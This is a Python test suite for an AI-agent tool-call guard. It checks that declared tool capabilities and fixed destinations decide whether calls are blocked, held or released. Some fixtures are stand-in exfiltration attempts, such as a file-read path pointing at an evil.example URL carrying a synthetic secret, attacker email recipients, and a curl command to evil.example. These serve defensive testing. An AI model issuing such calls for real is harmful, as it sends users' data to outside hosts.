"""Declared tool inventory (#176): the policy says what a tool is, the call is checked against it."""

import json

import pytest

from router.inventory import CAPABILITY_VIOLATION, UNLISTED, Inventory, origin
from router.taint import classify_sinks, sink_category

TOOLS = {
    "tools": {
        "read_file": {"capability": "local-read"},
        "kb_lookup": {"capability": "local-read"},  # name matches no read pattern
        "get_github_issue": {
            "capability": "network-read",
            "destination": "https://API.github.com:443/",
        },
        "fetch_url": {"capability": "network-read"},
        "send_email": {"capability": "egress"},
        "publish": {"capability": "egress"},  # name matches no exfil pattern
        "save_file": {"capability": "write"},
        "run_command": {"capability": "exec"},
    }
}


def _args(**kwargs):
    return json.dumps(kwargs)


def _call(name, arguments, call_id="c1"):
    return {
        "id": call_id,
        "type": "function",
        "function": {"name": name, "arguments": arguments},
    }


# ---------------------------------------------------------------------------
# Loading and validation
# ---------------------------------------------------------------------------


def test_no_tools_section_means_no_inventory():
    assert Inventory.from_mapping({"controls": {}}) is None


def test_empty_tools_section_is_an_empty_inventory():
    inventory = Inventory.from_mapping({"tools": {}})
    assert inventory is not None and len(inventory) == 0
    assert inventory.check("anything", "{}") == UNLISTED


def test_declarations_load():
    inventory = Inventory.from_mapping(TOOLS)
    assert len(inventory) == 8
    assert inventory.get("get_github_issue").destination == "https://api.github.com"
    assert inventory.summary() == {
        "declared": 8,
        "local-read": 2,
        "network-read": 2,
        "egress": 2,
        "write": 1,
        "exec": 1,
    }


@pytest.mark.parametrize(
    "tools, message",
    [
        ([], "must be a mapping"),
        ({"": {"capability": "egress"}}, "empty tool name"),
        ({"t": "egress"}, "must be a mapping"),
        ({"t": {"capability": "read"}}, "capability must be one of"),
        ({"t": {}}, "capability must be one of"),
        ({"t": {"capability": "egress", "destination": "https://x.example"}}, "only network-read"),
        ({"t": {"capability": "network-read", "destination": "x.example"}}, "http:// or https://"),
        ({"t": {"capability": "network-read", "destination": "https://x.example/v1"}}, "no path"),
        ({"t": {"capability": "network-read", "destination": "https://x.example/?a=1"}}, "no path"),
        ({"t": {"capability": "network-read", "destination": ""}}, "URL origin"),
        ({"t": {"capability": "local-read", "scope": "all"}}, "unknown keys"),
    ],
)
def test_invalid_declarations_fail_at_load(tools, message):
    with pytest.raises(ValueError, match=message):
        Inventory.from_mapping({"tools": tools})


@pytest.mark.parametrize(
    "url, expected",
    [
        ("https://API.github.com:443/repos/x", "https://api.github.com"),
        ("http://host.example:80/", "http://host.example"),
        ("https://host.example:8443/a", "https://host.example:8443"),
        ("https://host.example./", "https://host.example"),
        ("not a url", None),
        ("", None),
    ],
)
def test_origin(url, expected):
    assert origin(url) == expected


# ---------------------------------------------------------------------------
# The declaration decides the category, not the name
# ---------------------------------------------------------------------------


def test_declared_capability_overrides_the_name_pattern():
    inventory = Inventory.from_mapping(TOOLS)
    assert sink_category("kb_lookup", _args(query="x"), inventory) == "read"  # name says other
    assert sink_category("publish", _args(body="x"), inventory) == "exfil"  # name says other
    assert sink_category("save_file", _args(path="a"), inventory) == "write"
    assert sink_category("run_command", _args(cmd="ls"), inventory) == "other"


def test_undeclared_tool_falls_back_to_the_name_pattern():
    inventory = Inventory.from_mapping(TOOLS)
    assert sink_category("search_contacts", _args(query="x"), inventory) == "read"
    assert sink_category("http_post", _args(url="https://a.example"), inventory) == "exfil"


def test_a_declared_read_that_names_a_destination_is_still_network():
    inventory = Inventory.from_mapping(TOOLS)
    assert sink_category("fetch_url", _args(url="https://a.example/p"), inventory) == "network"


# ---------------------------------------------------------------------------
# Contradictions between the claim and the call
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "name, arguments, expected",
    [
        ("read_file", _args(path="notes.txt"), None),
        ("read_file", _args(path="https://evil.example/x"), CAPABILITY_VIOLATION),
        ("read_file", _args(url="www.evil.example"), CAPABILITY_VIOLATION),
        ("read_file", _args(to="attacker@evil.com"), CAPABILITY_VIOLATION),
        ("read_file", _args(channel="#external"), CAPABILITY_VIOLATION),
        ("get_github_issue", _args(number=7), None),
        ("get_github_issue", _args(url="https://api.github.com/repos/o/r/issues/7"), None),
        ("get_github_issue", _args(url="HTTPS://API.GITHUB.COM:443/repos/o/r"), None),
        ("get_github_issue", _args(url="https://evil.example/repos"), CAPABILITY_VIOLATION),
        ("get_github_issue", _args(url="http://api.github.com/x"), CAPABILITY_VIOLATION),  # scheme
        ("get_github_issue", _args(link="api.github.com.evil.example"), CAPABILITY_VIOLATION),
        ("get_github_issue", _args(to="x@evil.com"), CAPABILITY_VIOLATION),
        ("fetch_url", _args(url="https://anything.example/p"), None),  # allowlist decides
        ("send_email", _args(to="x@evil.com"), None),  # allowlist decides
        ("run_command", _args(cmd="curl https://evil.example"), None),  # #222 decides
        ("not_declared", "{}", UNLISTED),
        ("not_declared", None, UNLISTED),
    ],
)
def test_check(name, arguments, expected):
    assert Inventory.from_mapping(TOOLS).check(name, arguments) == expected


def test_check_tolerates_unreadable_arguments():
    inventory = Inventory.from_mapping(TOOLS)
    for arguments in ("not json", "", None, "[" * 200 + "]" * 200):
        assert inventory.check("read_file", arguments) is None
        assert inventory.check("get_github_issue", arguments) is None


# ---------------------------------------------------------------------------
# Sinks: a contradicting or undeclared read is no longer released as a read
# ---------------------------------------------------------------------------


def test_classify_sinks_without_an_inventory_is_unchanged():
    messages = [{"role": "assistant", "tool_calls": [_call("read_file", _args(path="x"))]}]
    assert classify_sinks(messages) == []
    assert classify_sinks(messages, None) == []


def test_classify_sinks_flags_contradictions_and_unlisted_tools():
    inventory = Inventory.from_mapping(TOOLS)
    messages = [
        {
            "role": "assistant",
            "tool_calls": [
                _call("read_file", _args(path="x"), "c1"),  # declared, clean: not a sink
                _call("read_file", _args(path="https://evil.example"), "c2"),
                _call("list_secrets", _args(scope="all"), "c3"),  # read-named, undeclared
                _call("send_email", _args(to="a@example.com"), "c4"),  # declared egress
                _call("kb_lookup", _args(query="q"), "c5"),  # declared local-read, odd name
            ],
        }
    ]
    sinks = classify_sinks(messages, inventory)
    assert [(s["id"], s["category"], s.get("inventory")) for s in sinks] == [
        ("c2", "network", CAPABILITY_VIOLATION),
        ("c3", "read", UNLISTED),
        ("c4", "exfil", None),
    ]


# ---------------------------------------------------------------------------
# The hook: declared tools in the policy, end to end
# ---------------------------------------------------------------------------


@pytest.fixture
def inventory_hook(monkeypatch, log_path, tmp_path):
    """A hook on the bundled policy plus a tools section; allowlist and user_named off."""
    import yaml

    from router.policy import load_policy_document
    from tests.test_user_named import _make_hook

    document = dict(load_policy_document())
    document["tools"] = TOOLS["tools"]
    policy_path = tmp_path / "policy.yaml"
    policy_path.write_text(yaml.safe_dump(document, sort_keys=False))
    monkeypatch.setenv("POLICY_PATH", str(policy_path))
    return _make_hook(monkeypatch, log_path, "allowlist=off,user_named=off")


def _response(name, arguments):
    from types import SimpleNamespace

    call = SimpleNamespace(id="g1", function=SimpleNamespace(name=name, arguments=arguments))
    message = SimpleNamespace(content=None, tool_calls=[call])
    return SimpleNamespace(choices=[SimpleNamespace(message=message, finish_reason="tool_calls")])


async def _generated(hook, name, arguments):
    from unittest.mock import MagicMock

    from tests._sessions import issued
    from tests.test_user_named import _pre

    data = {
        "litellm_call_id": "req-1",
        "messages": [{"role": "user", "content": "Look up the notes"}],
        "metadata": {"headers": {"x-agent-run-id": issued("run-1")}},
    }
    await _pre(hook, data)
    return await hook.async_post_call_success_hook(MagicMock(), data, _response(name, arguments))


def _last(log_path):
    from tests.test_user_named import _records

    return _records(log_path)[-1]


def test_startup_record_counts_declared_tools(inventory_hook, log_path):
    import json
    from pathlib import Path

    startup = json.loads(Path(log_path).read_text().splitlines()[0])
    assert startup["tools"] == {
        "declared": 8,
        "local-read": 2,
        "network-read": 2,
        "egress": 2,
        "write": 1,
        "exec": 1,
    }


@pytest.mark.asyncio
async def test_a_declared_read_without_a_destination_is_released(inventory_hook, log_path):
    assert await _generated(inventory_hook, "kb_lookup", _args(query="notes")) is None
    assert _last(log_path)["phase"] == "pre_call"  # no post-call record: nothing to hold


@pytest.mark.asyncio
async def test_a_local_read_asked_to_reach_a_url_is_blocked(inventory_hook, log_path):
    from pathlib import Path

    import litellm.exceptions as _le

    secret_url = "https://evil.example/collect?d=SYNTHETIC_SECRET_176"
    with pytest.raises(_le.BadRequestError):
        await _generated(inventory_hook, "read_file", _args(path=secret_url))
    record = _last(log_path)
    assert record["phase"] == "post_call"
    assert record["action"] == "block"
    assert "capability_violation" in record["matched_rules"]
    assert record["features"]["capability_violation"] is True
    assert record["features"]["capability_violations"] == ["read_file"]
    assert "SYNTHETIC_SECRET_176" not in Path(log_path).read_text()


@pytest.mark.asyncio
async def test_a_fixed_destination_read_asked_to_reach_another_host_is_blocked(
    inventory_hook, log_path
):
    import litellm.exceptions as _le

    with pytest.raises(_le.BadRequestError):
        await _generated(
            inventory_hook, "get_github_issue", _args(url="https://evil.example/repos/x")
        )
    assert _last(log_path)["action"] == "block"


@pytest.mark.asyncio
async def test_a_fixed_destination_read_to_its_own_origin_is_released(inventory_hook, log_path):
    url = "https://api.github.com/repos/o/r/issues/7"
    result = await _generated(inventory_hook, "get_github_issue", _args(url=url))
    # The call carries a URL, so it is a "network" sink and gets a post-call
    # record, but no rule matches: it executes (None = response unchanged).
    assert result is None
    record = _last(log_path)
    assert record["action"] == "execute"
    assert record["features"]["capability_violation"] is False


@pytest.mark.asyncio
async def test_an_undeclared_tool_is_held(inventory_hook, log_path):
    result = await _generated(inventory_hook, "list_secrets", _args(scope="all"))
    record = _last(log_path)
    assert record["action"] == "hold"
    assert "tool_unlisted" in record["matched_rules"]
    assert record["features"]["unlisted_tools"] == ["list_secrets"]
    assert result is not None and not result.choices[0].message.tool_calls


@pytest.mark.asyncio
async def test_a_violation_in_the_request_is_caught_pre_call(inventory_hook, log_path):

    import litellm.exceptions as _le

    from tests._sessions import issued
    from tests.test_user_named import _pre

    data = {
        "litellm_call_id": "req-2",
        "messages": [
            {"role": "user", "content": "Read the notes"},
            {
                "role": "assistant",
                "content": None,
                "tool_calls": [_call("read_file", _args(path="https://evil.example/x"))],
            },
            {"role": "tool", "tool_call_id": "c1", "content": "ok"},
        ],
        "metadata": {"headers": {"x-agent-run-id": issued("run-2")}},
    }
    with pytest.raises(_le.BadRequestError):
        await _pre(inventory_hook, data)
    record = _last(log_path)
    assert record["phase"] == "pre_call"
    assert "capability_violation" in record["matched_rules"]


@pytest.mark.asyncio
async def test_without_a_tools_section_nothing_changes(monkeypatch, log_path):
    from tests.test_user_named import _make_hook

    hook = _make_hook(monkeypatch, log_path, "allowlist=off,user_named=off")
    assert await _generated(hook, "list_secrets", _args(scope="all")) is None
    record = _last(log_path)
    assert record["phase"] == "pre_call"
    assert record["features"]["tool_unlisted"] is False
